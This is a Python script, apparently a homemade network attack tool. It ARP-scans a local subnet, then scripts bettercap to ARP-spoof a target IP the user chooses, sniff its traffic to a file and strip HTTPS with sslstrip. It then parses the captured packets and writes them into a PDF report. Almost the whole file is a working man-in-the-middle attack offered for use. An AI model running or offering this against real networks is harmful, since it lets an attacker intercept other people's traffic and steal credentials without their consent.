import subprocess
from scapy.all import *
from scapy.all import *
from datetime import datetime
from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas


def get_connected_devices(network_range):
    # Create an ARP request packet
    arp_request = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=network_range)

    # Send the packet and capture responses
    result = srp(arp_request, timeout=3, verbose=0)[0]

    # Get a list of connected devices
    connected_devices = []
    for sent, received in result:
        connected_devices.append({'IP': received.psrc, 'MAC': received.hwsrc})

    return connected_devices

# Provide the network range (e.g., '192.168.1.0/24') to scan
network_range = '192.168.1.0/24'

# Get the list of connected devices
devices = get_connected_devices(network_range)

# Print the connected devices
print("Connected Devices:")
for device in devices:
    print(f"IP: {device['IP']}\tMAC: {device['MAC']}")

def run_bettercap_commands(ip_addr, filename):
    try:
        # Start Bettercap
        bettercap_process = subprocess.Popen(["bettercap"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)

        # Run commands in Bettercap
        commands = [
            "net.probe on",
            "set arp.spoof.targets "+ ip_addr,
            "arp.spoof on",
            "set net.sniff.output "+filename,
            "set net.sniff.verbose true",
            "net.sniff on",
            "set https.proxy.sslstrip true"
        ]

        for command in commands:
            bettercap_process.stdin.write(command + "\n")
            bettercap_process.stdin.flush()

        # Print the output
        i=0
        print("Bettercap output:")
        for line in bettercap_process.stdout:
            if(i==35):
                break
            i=i+1
            print(line.strip())

        # Terminate Bettercap process
        bettercap_process.terminate()

    except subprocess.CalledProcessError as e:
        # If the command execution fails, print the error message
        print(f"Command execution failed with error: {e.stderr}")

# Run Bettercap commands
ip_addr = input("Please Add destination ip:")
filename = input("Please provide file name:")
f = open(filename, "x")
f.close()
run_bettercap_commands(ip_addr,filename)





def read_pcap(filename):
    packets = rdpcap(filename)  # Read pcap file

    # Iterate over each packet
    for packet in packets:
        # Display the packet content
        print(packet.show())

# Provide the path to your pcap file
pcap_path = filename

# Call the function to read and display the pcap file content
read_pcap(pcap_path)




def filter_pcap_by_protocol(pcap_file, protocol):
    packets = rdpcap(pcap_file)  # Read pcap file

    # Filter packets by protocol
    filtered_packets = [pkt for pkt in packets if protocol in pkt]

    # Generate PDF report with filtered packets
    generate_pdf_report(pcap_file, filtered_packets)

def generate_pdf_report(pcap_file, packets):
    # Create a PDF file with the same name as the pcap file
    pdf_file = pcap_file.replace('.pcap', '.pdf')
    c = canvas.Canvas(pdf_file, pagesize=letter)
    
    # Add a title to the report
    c.setFont("Helvetica-Bold", 16)
    c.drawString(50, 750, "Packet Analysis Report")
    c.setFont("Helvetica", 12)

    # Add packet information to the report
    y = 700
    for i, packet in enumerate(packets, start=1):
        c.drawString(50, y, f"Packet {i}")
        c.drawString(70, y - 20, f"Time: {packet.time}")
        c.drawString(70, y - 40, f"Summary: {packet.summary()}")
        c.drawString(70, y - 60, f"Raw Data: {packet.show(dump=True)}")
        c.line(50, y - 80, 550, y - 80)  # Separator line
        y -= 100
        if(y==0):
            c.showPage()
            y=700 

    # Save the PDF file
    c.save()

    print(f"PDF report generated: {pdf_file}")

# Provide the path to your pcap file
pcap_path =filename

# Prompt the user to enter a protocol
protocol = input("Enter the protocol to filter by: ").upper()

# Call the function to filter packets and generate the PDF report
filter_pcap_by_protocol(pcap_path, protocol)


